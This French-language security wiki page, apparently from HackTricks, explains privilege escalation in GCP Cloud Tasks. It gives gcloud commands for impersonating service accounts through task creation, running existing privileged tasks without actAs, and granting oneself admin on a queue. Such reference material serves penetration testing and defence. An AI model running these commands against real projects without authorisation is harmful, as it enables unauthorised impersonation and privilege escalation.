# GCP - Cloud Tasks Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Tasks

### `cloudtasks.tasks.create`, `iam.serviceAccounts.actAs`

Un attaquant disposant de ces permissions peut **usurper d'autres comptes de service** en créant des tâches qui s'exécutent avec l'identité du compte de service spécifié. Cela permet d'envoyer des **requêtes HTTP authentifiées vers des services Cloud Run ou Cloud Functions protégés par IAM**.

<details><summary>Créer une Cloud Task avec usurpation d'un compte de service</summary>
```bash
gcloud tasks create-http-task \
task-$(date '+%Y%m%d%H%M%S') \
--location us-central1 \
--queue <queue_name> \
--url 'https://<service_name>.us-central1.run.app' \
--method POST \
--header 'X-Hello: world' \
--body-content '{"hello":"world"}' \
--oidc-service-account-email <account>@<project_id>.iam.gserviceaccount.com
```
</details>

### `cloudtasks.tasks.run`, `cloudtasks.tasks.list`

Un attaquant disposant de ces permissions peut **exécuter des tâches programmées existantes** sans avoir de permissions sur le compte de service associé à la tâche. Cela permet d'exécuter des tâches qui ont été précédemment créées avec des comptes de service à privilèges plus élevés.

<details><summary>Exécuter une Cloud Task existante sans la permission actAs</summary>
```bash
gcloud tasks run projects/<project_id>/locations/us-central1/queues/<queue_name>/tasks/<task_id>
```
</details>

Le principal exécutant cette commande **n'a pas besoin de la permission `iam.serviceAccounts.actAs`** sur le compte de service de la tâche. Cependant, cela ne permet d'exécuter que des tâches existantes - cela ne donne pas la possibilité de créer ou modifier des tâches.

### `cloudtasks.queues.setIamPolicy`

Un attaquant disposant de cette permission peut **s'octroyer ou accorder à d'autres principals des rôles Cloud Tasks** sur des queues spécifiques, pouvant potentiellement escalader vers `roles/cloudtasks.admin` qui inclut la capacité de créer et d'exécuter des tâches.

<details><summary>Accorder le rôle Cloud Tasks admin sur une queue</summary>
```bash
gcloud tasks queues add-iam-policy-binding \
<queue_name> \
--location us-central1 \
--member serviceAccount:<account>@<project_id>.iam.gserviceaccount.com \
--role roles/cloudtasks.admin
```
</details>

Cela permet à l'attaquant d'accorder à tout compte de service qu'il contrôle des autorisations d'administrateur Cloud Tasks complètes sur la file d'attente.

## Références

- [Google Cloud Tasks Documentation](https://cloud.google.com/tasks/docs)

{{#include ../../../banners/hacktricks-training.md}}
